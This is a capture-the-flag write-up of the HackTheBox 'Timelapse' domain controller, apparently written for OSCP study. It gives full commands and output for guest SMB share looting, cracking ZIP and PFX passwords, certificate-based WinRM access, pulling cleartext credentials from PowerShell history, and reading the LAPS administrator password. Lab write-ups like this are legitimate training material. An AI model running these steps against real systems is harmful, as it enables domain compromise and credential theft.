# Timelapse - HackTheBox Writeup

**OS:** Windows (Server 2019, Domain Controller)
**Difficulty:** Easy
**Topics:** Guest SMB Enumeration, SMB Share Looting, Encrypted ZIP Cracking, PFX Certificate Cracking, Certificate-based WinRM, PowerShell History Looting, LAPS Password Read

---

## Enumeration

```bash
nmap -sC -sV -v 10.129.82.230
```

Relevant ports:
- **53** - DNS (Simple DNS Plus)
- **88** - Kerberos
- **135/139/445** - RPC / NetBIOS / SMB
- **389/3268** - LDAP, `Domain: timelapse.htb`
- **464** - kpasswd5
- **593** - RPC over HTTP
- **636/3269** - LDAPS / Global Catalog over SSL
- **5986** - WinRM over **HTTPS** (`ssl/wsmans`) - note: no 5985 (HTTP), so WinRM is TLS-only here

Host info: `Host: DC01; OS: Windows`, cert CN `dc01.timelapse.htb`. SMB signing enabled and required. ~8h clock skew vs scanner (relevant if Kerberos is used later).

### SMB enumeration

A null session authenticates but **share enumeration as a pure null session is denied**:

```bash
nxc smb 10.129.82.230 -u '' -p '' --shares
# ... [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

Falling back to the built-in **guest** account (empty password) unlocks the listing:

```bash
nxc smb 10.129.82.230 -u 'guest' -p '' --shares
```

```
Share           Permissions     Remark
-----           -----------     ------
ADMIN$
C$
IPC$            READ            Remote IPC
NETLOGON
Shares          READ
SYSVOL
```

A non-standard **`Shares`** share is readable.

---

## Foothold

### 1. Loot the Shares

```bash
smbclient -N //10.129.82.230/Shares
```

```
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

Contents:
- `Dev\winrm_backup.zip` - a password-protected ZIP
- `HelpDesk\LAPS.x64.msi`, `LAPS_Datasheet.docx`, `LAPS_OperationsGuide.docx`, `LAPS_TechnicalSpecification.docx` - LAPS documentation (a strong hint that **LAPS** is the privesc theme on this box)

### 2. Crack the ZIP

The ZIP contains `legacyy_dev_auth.pfx`. Extract the hash and crack with rockyou:

```bash
zip2john winrm_backup.zip > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

```
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)
```

ZIP password: **`supremelegacy`**

```bash
7z x winrm_backup.zip          # or: unzip winrm_backup.zip
```

### 3. Crack the PFX

The extracted `.pfx` (a PKCS#12 client certificate for WinRM auth) is itself password-protected:

```bash
pfx2john legacyy_dev_auth.pfx > pfx.hash
john pfx.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

```
thuglegacy       (legacyy_dev_auth.pfx)
```

PFX password: **`thuglegacy`**

> **Gotcha:** on recent Kali, `pfx2john` can crash with
> `asn1crypto ... ValueError: Insufficient data - 1 bytes requested but only 0 available`.
> That error is usually a **truncated/empty .pfx** (e.g. a bad extraction), not the
> tool - re-extract from `Dev\winrm_backup.zip` and run `pfx2john` against the
> intact copy. If it genuinely is the asn1crypto bug on a valid file, brute-force
> the password with openssl directly instead:
> ```bash
> while read -r p; do openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys \
>   -passin pass:"$p" >/dev/null 2>&1 && echo "[+] $p" && break; \
>   done < /usr/share/wordlists/rockyou.txt
> ```

### 4. Extract key + cert from the PFX

```bash
# Private key (unencrypted)
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy.key -nodes
# Client certificate
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out legacyy.crt
```

(openssl will prompt for the PFX import password cracked above.)

### 5. Certificate-based WinRM (port 5986 / SSL)

```bash
evil-winrm -i 10.129.82.230 -c legacyy.crt -k legacyy.key -S
```

- `-S` enables SSL (WinRM on 5986, since 5985 is closed here)
- `-c` / `-k` do **certificate** auth instead of a password

-> Shell as **`legacyy`**. `user.txt` on `C:\Users\legacyy\Desktop\`.

---

## Privilege Escalation

Theme: PowerShell history -> `svc_deploy` creds -> `svc_deploy` is in `LAPS_Readers` -> read the LAPS-managed local Administrator password off the DC computer object.

### 1. PowerShell history looting (as legacyy)

Check the current user's PowerShell console history - left behind on this box. The reliable path is via `$env:APPDATA` (note PSReadLine casing can vary):

```powershell
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

The history contains a saved remote-session snippet with `svc_deploy`'s password in cleartext:

```powershell
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p  = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c  = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}
```

Recovered credentials: **`svc_deploy`** : `E3R$Q62^12p7PLlC%KWaxuaV`

### 2. Confirm svc_deploy's group membership

```bash
nxc ldap 10.129.82.230 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -M groupmembership -o USER=svc_deploy
```

or from a shell:

```powershell
net user svc_deploy
```

```
Local Group Memberships      *Remote Management Use(rs)
Global Group memberships     *LAPS_Readers         *Domain Users
```

`svc_deploy` is a member of **`LAPS_Readers`** - a group granted the right to read the LAPS-managed local admin password attribute (`ms-Mcs-AdmPwd`) on domain computers - and of **`Remote Management Users`**, so it can also log in over WinRM directly.

### 3. Read the LAPS password for the DC

```bash
nxc ldap 10.129.82.230 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -M laps
```

Alternatives (any one works):

```bash
# pyLAPS
python3 pyLAPS.py --action get -d timelapse.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV'

# raw LDAP read of the ms-Mcs-AdmPwd attribute
ldapsearch -x -H ldap://10.129.82.230 -D 'svc_deploy@timelapse.htb' \
  -w 'E3R$Q62^12p7PLlC%KWaxuaV' -b 'DC=timelapse,DC=htb' \
  '(ms-Mcs-AdmPwd=*)' ms-Mcs-AdmPwd
```

`-M laps` prints the DC's local admin password:

```
LAPS  Computer:DC01$  User:  Password:<LAPS password - rotates per boot>
```

> The recovered password is the **local Administrator** password for `DC01`, not a domain password. It rotates on every boot, so re-read it with `-M laps` if a saved one stops working.

### 4. Administrator access

```bash
evil-winrm -i 10.129.82.230 -u Administrator -p '<LAPS password>' -S
```

-> Shell as **`Administrator`**.

> **Root flag location:** `root.txt` is **not** on the Administrator desktop on this box - it lives on another user's desktop (`C:\Users\TRX\Desktop\root.txt`). As Administrator you can read any profile. Hunt for it rather than assuming the default path:
> ```powershell
> Get-ChildItem C:\Users\ -Recurse -Filter root.txt -ErrorAction SilentlyContinue |
>   ForEach-Object { $_.FullName; Get-Content $_.FullName }
> ```

---

## Summary

| Step | Technique | Tool |
|------|-----------|------|
| Recon | TCP scan, AD/DC fingerprinting, spotted WinRM-over-SSL only | nmap |
| SMB enum | Guest-session share listing (null denied) | NetExec (nxc) |
| Loot | Read `Shares`, pulled `winrm_backup.zip` + LAPS docs | smbclient |
| Crack #1 | Crack encrypted ZIP | zip2john + john (rockyou) |
| Crack #2 | Crack PFX certificate password | pfx2john + john (rockyou) |
| Prep | Extract key/cert from PFX | openssl |
| Foothold | Certificate-based WinRM over SSL | evil-winrm `-c/-k/-S` |
| Local enum | PowerShell history -> svc_deploy creds | ConsoleHost_history.txt |
| PrivEsc | svc_deploy in LAPS_Readers -> read DC LAPS password | NetExec `-M laps` |
| Admin access | WinRM as Administrator with LAPS password | evil-winrm |

---

## OSCP Notes

- When a **null session authenticates but `--shares` returns `ACCESS_DENIED`**, retry as the built-in `guest` account with an empty password - it often unlocks share enumeration on a DC where pure null does not.
- LAPS documentation sitting in a readable share is a **planted hint**: expect the privesc to end in reading a LAPS-managed local Administrator password. Note the theme early, come back to it after foothold.
- Password-protected archives and `.pfx`/`.p12` files crack with `john` via `zip2john` and `pfx2john` - both are usually fast against rockyou. Check `john <hash> --show` to recall a cracked password later.
- A `.pfx` is a **client certificate**, not a password: convert it with `openssl pkcs12` (`-nocerts -nodes` for the key, `-nokeys` for the cert) and authenticate with `evil-winrm -c cert -k key`, adding `-S` when only WinRM-over-HTTPS (5986) is open.
- `ConsoleHost_history.txt` (PSReadline) is one of the first things to grep after landing a Windows shell - admins and service setup scripts routinely leave plaintext credentials there.
- `LAPS_Readers` (or any group with read access to `ms-Mcs-AdmPwd`) is effectively a path to local admin on every LAPS-managed machine it covers; NetExec's `-M laps` module reads the attribute directly over LDAP with those creds.
- Remember LAPS passwords **rotate** - if a recovered one fails, read it again rather than assuming the account changed.
- **Flags aren't always on the obvious desktop.** Here `root.txt` is under `C:\Users\TRX\Desktop\`, not Administrator's. When a flag isn't where expected, recurse the filesystem for it (`Get-ChildItem C:\Users\ -Recurse -Filter root.txt`) instead of giving up.
- On HTB the **box IP changes on every start/reset** - a sudden `Errno::EHOSTUNREACH` / "No route to host" from evil-winrm usually means the machine was reset to a new IP (or the VPN dropped), not a tooling problem. Re-check the IP and `ping`/`nxc` before debugging the exploit.
